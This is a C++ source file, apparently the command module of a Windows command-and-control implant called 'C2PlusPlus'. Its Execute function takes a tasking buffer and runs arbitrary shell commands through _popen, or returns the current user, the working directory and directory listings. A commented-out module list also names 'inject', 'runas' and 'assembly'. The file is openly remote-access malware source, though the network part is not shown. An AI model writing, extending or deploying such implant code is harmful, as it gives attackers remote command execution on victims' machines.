#include "Module.h"
#include <random>
#include <windows.h>
#include <vector>
#include <iterator>
#include <iostream>

namespace C2PlusPlus
{
    //std::vector<std::string> AvailableModules{ "cmd","whoami","ls","processes","cd","cat","assembly","inject","runas","reverttoself" };

    std::string Module::Cmd(const std::string& command)
    {
        char buffer[128];
        std::string result = "";

        FILE* pipe = _popen(command.c_str(), "r");
        if (!pipe) {
            return "popen failed!";
        }

        // read till end of process:
        while (!feof(pipe)) {

            // use buffer to read and add to result
            if (fgets(buffer, 128, pipe) != NULL)
                result += buffer;
        }

        _pclose(pipe);
        return result;



    }
    std::string Module::GetCurrentUserName()
    {
        std::string username = "";

        char acUsername[100];
        DWORD nUserName = sizeof(acUsername);
        if (GetUserNameA(acUsername, &nUserName))
            username = acUsername;

        return username;
    }
    std::string Module::PWD()
    {
        std::string pwd = "";

        char acpwd[256];
        DWORD nPwn = sizeof(acpwd);
        if (GetCurrentDirectoryA(nPwn, acpwd))
            pwd = acpwd;

        return pwd;
    }

    std::string Module::ListCurrentDir(std::string path)
    {
        std::vector<std::string> directories;
        std::vector<std::string> files;

        std::string pwd = path;

        std::string list = "";
        HANDLE hFind;
        WIN32_FIND_DATAA data;
        TCHAR szDir[MAX_PATH];

        hFind = FindFirstFileA((path + "*").c_str(), &data);
        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                if (data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) // CHECK IF Directory
                {
                    directories.push_back(data.cFileName);
                }
                else
                {
                    files.push_back(data.cFileName);
                }
                //list += std::to_string(((data.nFileSizeHigh * (MAXDWORD + 1)) + data.nFileSizeLow)/1024.0) + "KB"; //File Size
            } while (FindNextFileA(hFind, &data));
            FindClose(hFind);

            list += "----- Directories ----- \n";

            for (size_t i = 0; i < directories.size(); i++)
            {
                if (directories[i] != "." && directories[i] != "..")
                    list += pwd + directories[i] + "\n";
            }

            list += "\n----- Files ----- \n";

            for (size_t i = 0; i < files.size(); i++)
            {
                list += pwd + files[i] + "\n";
            }

        }

        return list;
    }
    std::string Module::ListCurrentDir()
    {
        std::vector<std::string> directories;
        std::vector<std::string> files;

        std::string pwd = PWD();

        std::string list = "";
        std::string path = "*";
        HANDLE hFind;
        WIN32_FIND_DATAA data;
        TCHAR szDir[MAX_PATH];

        hFind = FindFirstFileA(path.c_str(), &data);
        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                if (data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) // CHECK IF Directory
                {
                    directories.push_back(data.cFileName);
                }
                else
                {
                    files.push_back(data.cFileName);
                }
                //list += std::to_string(((data.nFileSizeHigh * (MAXDWORD + 1)) + data.nFileSizeLow)/1024.0) + "KB"; //File Size
            } while (FindNextFileA(hFind, &data));
            FindClose(hFind);

            list += "----- Directories ----- \n";

            for (size_t i = 0; i < directories.size(); i++)
            {
                if (directories[i] != "." && directories[i] != "..")
                    list += pwd + "\\" + directories[i] + "\n";
            }

            list += "\n----- Files ----- \n";

            for (size_t i = 0; i < files.size(); i++)
            {
                list += pwd + "\\" + files[i] + "\n";
            }

        }

        return list;
    }
    std::string Module::Random()
    {
        std::string str("0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz");

        std::random_device rd;
        std::mt19937 generator(rd());

        std::shuffle(str.begin(), str.end(), generator);

        return str.substr(0, 8);
    }

    // Remove the module name from the buffer
    void eraseSubStr(std::string& mainStr, const std::string& toErase)
    {
        // Search for the substring in string
        size_t pos = mainStr.find(toErase);
        if (pos != std::string::npos)
        {
            // If found then erase it from string
            mainStr.erase(pos, toErase.length());
        }
    }

    std::string Module::Execute(std::string buffer)
    {
        std::string selectedModule = buffer.substr(0, buffer.find(" "));
        eraseSubStr(buffer, selectedModule + " ");
        std::string command = buffer; 
        
        if (selectedModule == "cmd")
        {
            result = Cmd(command + " 2>&1"); //+" 2>&1"; // 2>&1 added to capture the stderr 
        }
        else if (selectedModule == "whoami")
        {
            result = GetCurrentUserName();
        }
        else if (selectedModule == "pwd")
        {
            result = PWD();
        }   
        else if (selectedModule == "ls")
        {
            if (command != "ls")
                result = ListCurrentDir(command);
            else
                result = ListCurrentDir();
        }
        else
        {
            result = "[-] Module does not exits.";
        }

        return result;
    }
}